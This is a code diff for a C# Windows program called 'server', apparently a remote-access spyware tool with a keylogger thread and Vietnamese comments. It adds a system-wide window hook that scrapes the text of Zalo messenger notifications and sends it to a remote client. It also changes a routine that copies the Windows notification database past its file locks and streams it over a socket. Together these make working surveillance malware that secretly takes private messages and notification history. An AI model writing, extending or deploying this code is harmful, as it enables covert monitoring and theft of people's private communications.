@@ -18,6 +18,8 @@ using KeyLogger;
 using System.Threading;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Windows.Automation;
+
 namespace server
 {
     public partial class server : Form
@@ -28,6 +30,42 @@ namespace server
         DateTime lastSendTime = DateTime.MinValue;
         PerformanceCounter cpuCounter;
         PerformanceCounter ramCounter;
+
+        // ===== ZALO NOTIFY HOOK =====
+        delegate void WinEventDelegate(
+            IntPtr hWinEventHook,
+            uint eventType,
+            IntPtr hwnd,
+            int idObject,
+            int idChild,
+            uint dwEventThread,
+            uint dwmsEventTime
+        );
+
+        [DllImport("user32.dll")]
+        static extern IntPtr SetWinEventHook(
+            uint eventMin,
+            uint eventMax,
+            IntPtr hmodWinEventProc,
+            WinEventDelegate lpfnWinEventProc,
+            uint idProcess,
+            uint idThread,
+            uint dwFlags
+        );
+
+        [DllImport("user32.dll")]
+        static extern uint GetWindowThreadProcessId(
+            IntPtr hWnd,
+            out uint lpdwProcessId
+        );
+
+        const uint EVENT_OBJECT_SHOW = 0x8002;
+        const uint WINEVENT_OUTOFCONTEXT = 0;
+
+        IntPtr zaloHook = IntPtr.Zero;
+        WinEventDelegate zaloDelegate;
+
+        
 
         public server()
         {
@@ -42,7 +80,7 @@ namespace server
             tklog.SetApartmentState(ApartmentState.STA); 
             tklog.IsBackground = true; 
             tklog.Start();
-            
+            startZaloNotifyHook();
             
             KeyLogger.appstart.isRecording = false;
         }
@@ -78,6 +116,87 @@ namespace server
             {
                 // Nếu lỗi thì bỏ qua, không làm crash server
             }
+        }
+
+        public void startZaloNotifyHook()
+        {
+            try
+            {
+                zaloDelegate = new WinEventDelegate(ZaloWinEvent);
+
+                zaloHook = SetWinEventHook(
+                    EVENT_OBJECT_SHOW,
+                    EVENT_OBJECT_SHOW,
+                    IntPtr.Zero,
+                    zaloDelegate,
+                    0,
+                    0,
+                    WINEVENT_OUTOFCONTEXT
+                );
+            }
+            catch { }
+        }
+
+
+        void ZaloWinEvent(
+            IntPtr hWinEventHook,
+            uint eventType,
+            IntPtr hwnd,
+            int idObject,
+            int idChild,
+            uint dwEventThread,
+            uint dwmsEventTime)
+        {
+            try
+            {
+                if (hwnd == IntPtr.Zero) return;
+
+                uint pid;
+                GetWindowThreadProcessId(hwnd, out pid);
+
+                Process p = Process.GetProcessById((int)pid);
+
+                // Chỉ bắt Zalo
+                if (!p.ProcessName.ToLower().Contains("zalo"))
+                    return;
+
+                AutomationElement root = AutomationElement.FromHandle(hwnd);
+                if (root == null) return;
+
+                string text = ExtractZaloText(root);
+                if (string.IsNullOrWhiteSpace(text)) return;
+
+                // Gửi về client
+                Program.nw.WriteLine("[ZALO_NOTIFY]");
+                Program.nw.WriteLine(text);
+                Program.nw.Flush();
+            }
+            catch { }
+        }
+
+        string ExtractZaloText(AutomationElement root)
+        {
+            StringBuilder sb = new StringBuilder();
+
+            try
+            {
+                var walker = TreeWalker.ControlViewWalker;
+                var child = walker.GetFirstChild(root);
+
+                while (child != null)
+                {
+                    if (child.Current.ControlType == ControlType.Text)
+                    {
+                        string name = child.Current.Name;
+                        if (!string.IsNullOrWhiteSpace(name))
+                            sb.AppendLine(name);
+                    }
+                    child = walker.GetNextSibling(child);
+                }
+            }
+            catch { }
+
+            return sb.ToString().Trim();
         }
 
         public RegistryKey baseRegistryKey(ref String link)
@@ -191,51 +310,47 @@ namespace server
 
         public void getNotiDB()
         {
-            string bestPath = "";
-            long maxLen = -1;
+            string tempPath = Path.GetTempFileName(); // Tạo tên file tạm
+            bool success = false;
 
             try
             {
-                string usersPath = @"C:\Users";
-                if (Directory.Exists(usersPath))
+                // 1. Xác định đường dẫn DB chính xác
+                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                string dbPath = Path.Combine(localAppData, @"Microsoft\Windows\Notifications\wpndatabase.db");
+
+                // Nếu không tìm thấy ở user hiện tại, thử tìm thủ công trong C:\Users
+                if (!File.Exists(dbPath))
                 {
-                    // 1. Quét TẤT CẢ các user trong máy
-                    foreach (string dir in Directory.GetDirectories(usersPath))
-                    {
-                        string checkPath = Path.Combine(dir, @"AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db");
-                        
-                        if (File.Exists(checkPath))
-                        {
-                            try 
-                            {
-                                // Lấy kích thước file
-                                long len = new FileInfo(checkPath).Length;
-                                
-                                // Nếu tìm thấy file nặng hơn file trước đó -> Đây mới là file của người dùng chính
-                                if (len > maxLen)
-                                {
-                                    maxLen = len;
-                                    bestPath = checkPath;
-                                }
-                            }
-                            catch {}
-                        }
-                    }
+                    string currentName = Environment.UserName;
+                    
+                    // --- [SỬA LỖI Ở ĐÂY]: Thay cú pháp $"" bằng cộng chuỗi bình thường ---
+                    dbPath = @"C:\Users\" + currentName + @"\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db";
+                    // -------------------------------------------------------------------
                 }
 
-                if (bestPath != "" && maxLen > 0)
+                if (File.Exists(dbPath))
                 {
-                    // 2. Copy file tốt nhất tìm được
-                    string tempPath = Path.GetTempFileName();
-                    
-                    using (FileStream source = new FileStream(bestPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    // 2. KỸ THUẬT COPY XUYÊN KHÓA (FileShare.ReadWrite)
+                    using (FileStream source = new FileStream(dbPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
                         using (FileStream dest = new FileStream(tempPath, FileMode.Create))
                         {
                             source.CopyTo(dest);
                         }
                     }
+                    success = true;
+                }
+            }
+            catch 
+            {
+                success = false; 
+            }
 
+            try
+            {
+                if (success)
+                {
                     // 3. Gửi kích thước
                     long len = new FileInfo(tempPath).Length;
                     Program.nw.WriteLine(len.ToString());
@@ -251,20 +366,20 @@ namespace server
                             Program.client.Send(buffer, 0, bytesRead, SocketFlags.None);
                         }
                     }
-                    
-                    try { File.Delete(tempPath); } catch { }
                 }
                 else
                 {
-                    // Không tìm thấy file nào -> Gửi 0
                     Program.nw.WriteLine("0"); Program.nw.Flush();
                 }
+                
+                if (File.Exists(tempPath)) File.Delete(tempPath);
             }
-            catch (Exception ex)
+            catch
             {
                 Program.nw.WriteLine("0"); Program.nw.Flush();
             }
         }
+
         public String getvalue(ref RegistryKey a,ref String link,ref String valueName)
         {
             a=a.OpenSubKey(link);
